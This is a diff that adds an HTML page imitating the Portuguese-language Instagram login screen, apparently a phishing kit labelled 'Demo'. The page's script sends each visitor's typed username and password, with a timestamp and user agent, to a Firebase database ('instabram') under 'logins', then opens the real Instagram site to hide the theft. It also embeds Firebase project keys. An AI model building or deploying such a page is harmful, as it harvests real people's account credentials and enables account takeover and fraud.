@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Demo</title>
+    <style>
+        body {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            min-height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        html {
+            height: 100%;
+        }
+
+        .login-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            width: 350px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .logo h1 {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 51px;
+            margin: 0;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: normal;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+            box-sizing: border-box;
+        }
+
+        .form-input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .form-input::placeholder {
+            color: #8e8e8e;
+        }
+
+        .login-button {
+            width: 100%;
+            background: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px 16px;
+            margin: 16px 0;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background: #1877f2;
+        }
+
+        .login-button:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .facebook-login:hover {
+            color: #1e3a5f;
+        }
+
+        .facebook-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 12px;
+        }
+
+        .forgot-password a {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            margin-top: 10px;
+            text-align: center;
+            width: 350px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        .signup-box p {
+            margin: 0;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+
+    </style>
+</head>
+<body>
+    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+        <div class="login-container">
+            <div class="logo">
+                <h1>Instagram</h1>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" class="form-input" placeholder="Telefone, nome de usuário ou email" required>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" class="form-input" placeholder="Senha" required>
+                </div>
+
+                <button type="submit" class="login-button">Entrar</button>
+            </form>
+
+            <div class="divider">
+                <span>ou</span>
+            </div>
+
+            <a href="#" class="facebook-login" onclick="showDemoMessage(event)">
+                <svg class="facebook-icon" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+                Entrar com o Facebook
+            </a>
+
+            <div class="forgot-password">
+                <a href="#" onclick="showDemoMessage(event)">Esqueceu a senha?</a>
+            </div>
+        </div>
+
+        <div class="signup-box">
+            <p>Não tem uma conta? <a href="#" onclick="showDemoMessage(event)">Cadastre-se</a></p>
+        </div>
+    </div>
+
+    <script type="module">
+        // Import Firebase functions
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDZaTtI_4v7a8VP9BdYFzMzMvpYDWe56Ec",
+            authDomain: "instabram-bd1db.firebaseapp.com",
+            databaseURL: "https://instabram-bd1db-default-rtdb.firebaseio.com",
+            projectId: "instabram-bd1db",
+            storageBucket: "instabram-bd1db.firebasestorage.app",
+            messagingSenderId: ".",
+            appId: "1:.:web:b26019f55a7cbdce0387b6"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('.login-button');
+            const originalText = button.textContent;
+            const username = this.querySelector('input[type="text"]').value;
+            const password = this.querySelector('input[type="password"]').value;
+            
+            button.textContent = 'Entrando...';
+            button.disabled = true;
+            
+            try {
+                // Save to Firebase
+                const loginData = {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent
+                };
+                
+                await push(ref(database, 'logins'), loginData);
+                
+                // Redirect to Instagram after successful save
+                setTimeout(() => {
+                    window.open('https://www.instagram.com', '_blank');
+                    button.textContent = originalText;
+                    button.disabled = false;
+                    // Clear form
+                    this.reset();
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Erro ao salvar:', error);
+                alert('Erro ao processar login. Tente novamente.');
+                button.textContent = originalText;
+                button.disabled = false;
+            }
+        });
+
+        function showDemoMessage(event) {
+            event.preventDefault();
+            alert('Esta funcionalidade redirecionará para o Instagram após o login!');
+        }
+
+        // Make showDemoMessage available globally
+        window.showDemoMessage = showDemoMessage;
+
+        // Efeito de foco nos inputs
+        document.querySelectorAll('.form-input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#a8a8a8';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.style.borderColor = '#dbdbdb';
+            });
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'98b25e6b51015cb7',t:'MTc1OTg5MjIyNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
